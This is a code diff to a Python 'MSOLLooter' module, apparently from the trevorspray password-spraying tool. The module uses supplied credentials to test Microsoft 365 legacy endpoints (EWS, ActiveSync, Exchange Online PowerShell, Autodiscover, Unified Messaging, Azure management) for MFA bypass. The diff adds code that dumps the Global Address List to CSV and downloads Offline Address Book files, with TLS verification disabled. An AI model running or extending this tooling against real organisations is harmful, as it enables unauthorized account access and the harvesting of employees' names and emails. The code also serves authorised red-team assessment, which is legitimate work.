@@ -4,7 +4,7 @@ import requests
 from .base import Looter
 from contextlib import suppress
 from requests.auth import HTTPBasicAuth
-from ..util import windows_user_agent,highlight_json
+from ..util import windows_user_agent, highlight_json, highlight_xml, download_file
 
 
 log = logging.getLogger('trevorspray.looters.msol')
@@ -23,6 +23,7 @@ class MSOLLooter(Looter):
         self.test_exo_pwsh(username, password)
         self.test_autodiscover(username, password)
         self.test_azure_management(username, password)
+        self.test_um(username, password)
 
 
     def test_imap(self, username, password):
@@ -112,32 +113,49 @@ class MSOLLooter(Looter):
 
     def test_ews(self, username, password):
 
-        log.info(f'Testing Exchange Web Services (EWS) MFA bypass for {username} (https://outlook.office365.com/EWS/Exchange.asmx)')
+        url = 'https://outlook.office365.com/EWS/Exchange.asmx'
+        log.info(f'Testing Exchange Web Services (EWS) MFA bypass for {username} ({url})')
+        import csv
         import poplib
         import string
         import datetime
         import exchangelib
+        from exchangelib.errors import ErrorNameResolutionNoResults
         success = False
         contacts_retrieved = 0
 
         # curl -v -H 'Content-Type: text/xml' https://outlook.office365.com/EWS/Exchange.asmx --user "BOB@EVILCORP.COM:Password123" --data-binary $'<?xml version=\'1.0\' encoding=\'utf-8\'?>\x0a<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"><s:Header><t:RequestServerVersion Version=\"Exchange2019\"/></s:Header><s:Body><m:ResolveNames ReturnFullContactData=\"false\"><m:UnresolvedEntry>BOB@EVILCORP.COM</m:UnresolvedEntry></m:ResolveNames></s:Body></s:Envelope>'
         try:
             credentials = exchangelib.Credentials(username, password)
-            config = exchangelib.Configuration(service_endpoint='https://outlook.office365.com/EWS/Exchange.asmx', credentials=credentials)
+            config = exchangelib.Configuration(service_endpoint=url, credentials=credentials)
             account = exchangelib.Account(primary_smtp_address=username, config=config, autodiscover=False, access_type=exchangelib.DELEGATE)
             log.success(f'MFA bypass (EWS) enabled for {username}!')
             success = True
 
             try:
+                found = set()
                 domain = username.split('@')[-1]
-                filename = self.sprayer.trevor.home / datetime.now().strftime('%Y%m%d_%H%M%S') + f'{domain}_gal.txt'
-                log.success(f'MFA bypass (EWS) enabled for {username}! Attempting to dump Global Address List')
-                with open(str(filename), "a") as f:
+                filename = self.loot_dir / (datetime.datetime.now().strftime('%Y%m%d_%H%M%S') + f'_{domain}_gal.csv')
+                log.success(f'Attempting to dump Global Address List')
+                with open(str(filename), 'a', newline='') as f:
+                    c = csv.DictWriter(f, fieldnames=['Name', 'Email'])
+                    c.writeheader()
                     for i in list(string.ascii_lowercase):
-                        for mailbox, contact in account.protocol.resolve_names([i], return_full_contact_data=True):
-                            log.success(f'Email looted: {mailbox.email_address}')
-                            f.write(mailbox.email_address + "\n")
-                            contacts_retrieved += 1
+
+                        results = account.protocol.resolve_names([i], return_full_contact_data=True)
+                        for result in results:
+                            if type(result) not in (ErrorNameResolutionNoResults,):
+                                mailbox, contact = result
+                                name = str(getattr(mailbox, 'name', ''))
+                                email = str(getattr(mailbox, 'email_address', ''))
+                                if not (name, email) in found:
+                                    found.add((name, email))
+                                    log.success(f'Contact looted: {name} - {email}')
+                                    c.writerow({
+                                        'Name': name,
+                                        'Email': email
+                                    })
+                                    contacts_retrieved += 1
 
             except exchangelib.errors.EWSError as e:
                 log.warning(f'Failed to retrieve GAL for {domain}: {e}')
@@ -160,21 +178,23 @@ class MSOLLooter(Looter):
     def test_eas(self, username, password):
 
         success = False
+        url = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'
         log.info(f'Testing Exchange ActiveSync (EAS) MFA bypass for {username}')
 
         response = None
         with suppress(Exception):
             response = requests.options(
-                'https://outlook.office365.com/Microsoft-Server-ActiveSync',
+                url,
                 headers = {
                     'User-Agent': windows_user_agent
                 },
-                auth=HTTPBasicAuth(username, password)
+                auth=HTTPBasicAuth(username, password),
+                verify=False
             )
             response_headers = dict(getattr(response, 'headers', {}))
 
         if getattr(response, 'status_code', 0) == 200:
-            log.success(f'MFA bypass (Exchange ActiveSync) enabled for {username}!')
+            log.success(f'MFA bypass (Exchange ActiveSync) enabled for {username}! ({url})')
             success = True
 
         if success and response_headers:
@@ -186,25 +206,23 @@ class MSOLLooter(Looter):
     def test_exo_pwsh(self, username, password):
 
         success = False
+        url = 'https://outlook.office365.com/powershell-liveid/'
         log.info(f'Testing Exchange Online Powershell (EXO) MFA bypass for {username}')
 
         response = None
         with suppress(Exception):
             response = requests.options(
-                'https://outlook.office365.com/powershell-liveid/',
+                url,
                 headers = {
                     'User-Agent': windows_user_agent
                 },
-                auth=HTTPBasicAuth(username, password)
+                auth=HTTPBasicAuth(username, password),
+                verify=False
             )
-            response_headers = dict(getattr(response, 'headers', {}))
 
         if getattr(response, 'status_code', 0) == 200:
-            log.success(f'MFA bypass (Exchange Online Powershell) enabled for {username}!')
+            log.success(f'MFA bypass (Exchange Online Powershell) enabled for {username} ({url})!')
             success = True
-
-        if success and response_headers:
-            log.success(highlight_json(response_headers))
 
         return success
 
@@ -212,25 +230,31 @@ class MSOLLooter(Looter):
     def test_autodiscover(self, username, password):
 
         success = False
+        url = 'https://outlook.office365.com/autodiscover/autodiscover.xml'
+        auth = HTTPBasicAuth(username, password)
         log.info(f'Testing Autodiscover MFA bypass for {username}')
 
         response = None
-        with suppress(Exception):
-            response = requests.get(
-                'https://outlook.office365.com/autodiscover/autodiscover.xml',
+        try:
+            response = requests.post(
+                url,
                 headers = {
                     'User-Agent': windows_user_agent,
                     'Content-Type': 'text/xml'
                 },
-                auth=HTTPBasicAuth(username, password),
+                auth=auth,
                 data=f'<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{username}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>',
                 verify=False
             )
-            response_headers = dict(getattr(response, 'headers', {}))
+
+            if getattr(response, 'status_code', 0) == 200:
+                log.success(f'MFA bypass (Autodiscover) enabled for {username}! ({url})')
+                log.success(highlight_xml(response.content))
+                success = True
 
             log.info(f'Testing Offline Address Book (OAB) MFA bypass for {username}')
             try:
-                found = re.search('<OABUrl>(http.*)</OABUrl>', response.text)
+                found = re.search(r'<OABUrl>(http.*)</OABUrl>', response.text)
 
                 if found:
                     log.success(f'Found OAB URL for {username}: {found.group(1)}')
@@ -242,13 +266,20 @@ class MSOLLooter(Looter):
                             'User-Agent': windows_user_agent,
                             'Content-Type': 'text/xml'
                         },
-                        auth=HTTPBasicAuth(username, password),
+                        auth=auth,
                         verify=False
                     )
                     found = re.search(r'>(.+lzx)<', oab_response.text)
 
                     if found:
-                        log.success(f'Found LZX link for {username}: {found.group(1)}')
+                        lzx_url = f'{oab_url}{found.group(1)}'
+                        log.success(f'Found LZX for {username}: {lzx_url}')
+                        lzx_file = self.loot_dir / lzx_url.split('/')[-1]
+                        log.success(f'Downloading LZX for {username} to {lzx_file}')
+                        try:
+                            download_file(url, str(lzx_file), verify=False, auth=auth)
+                        except Exception as e:
+                            log.warning(f'Failed to retrieve LZX file at {lzx_url}')
                     else:
                         log.warning(f'No LZX link found for {username}')
 
@@ -262,12 +293,12 @@ class MSOLLooter(Looter):
                 else:
                     log.error(f'Encountered error while checking for OAB (-v to debug): {e}')
 
-        if getattr(response, 'status_code', 0) == 200:
-            log.success(f'MFA bypass (Autodiscover) enabled for {username}!')
-            success = True
-
-        if success and response_headers:
-            log.success(highlight_json(response_headers))
+        except Exception as e:
+            if log.level <= logging.DEBUG:
+                import traceback
+                log.error(traceback.format_exc())
+            else:
+                log.error(f'Encountered error while checking Autodiscover (-v to debug): {e}')
 
         return success
 
@@ -295,7 +326,7 @@ class MSOLLooter(Looter):
             'User-Agent': 'Windows-AzureAD-Authentication-Provider/1.0',
         }
 
-        with suppress(Exception):
+        try:
             response = requests.get(
                 'https://login.microsoftonline.com/common/oauth2/token',
                 headers=headers,
@@ -314,5 +345,53 @@ class MSOLLooter(Looter):
                 success = True
             else:
                 log.warn(f'Azure management not enabled for {username}.')
+
+        except Exception as e:
+            if log.level <= logging.DEBUG:
+                import traceback
+                log.error(traceback.format_exc())
+            else:
+                log.error(f'Encountered error while checking Azure Management API (-v to debug): {e}')
+
+
+        return success
+
+
+    def test_um(self, username, password):
+
+        success = False
+        url = 'https://outlook.office365.com/EWS/UM2007Legacy.asmx'
+        log.info(f'Testing Unified Messaging (UM) MFA bypass for {username}')
+
+        response = None
+        try:
+            response = requests.post(
+                url,
+                headers = {
+                    'User-Agent': windows_user_agent,
+                    'Content-Type': 'text/xml; charset=utf-8'
+                },
+                auth=HTTPBasicAuth(username, password),
+                data='''<?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body>
+    <GetUMProperties xmlns="https://schemas.microsoft.com/exchange/services/2006/messages" />
+    </soap:Body>
+    </soap:Envelope>''',
+                verify=False
+            )
+            response_headers = dict(getattr(response, 'headers', {}))
+
+            if getattr(response, 'status_code', 0) != 401 and 'text/xml' in response.headers.get('Content-Type'):
+                log.success(f'MFA bypass (Unified Messaging) enabled for {username}! ({url})')
+                log.debug(highlight_xml(response.content))
+                success = True
+
+        except Exception as e:
+            if log.level <= logging.DEBUG:
+                import traceback
+                log.error(traceback.format_exc())
+            else:
+                log.error(f'Encountered error while checking Unified Messaging (-v to debug): {e}')
 
         return success
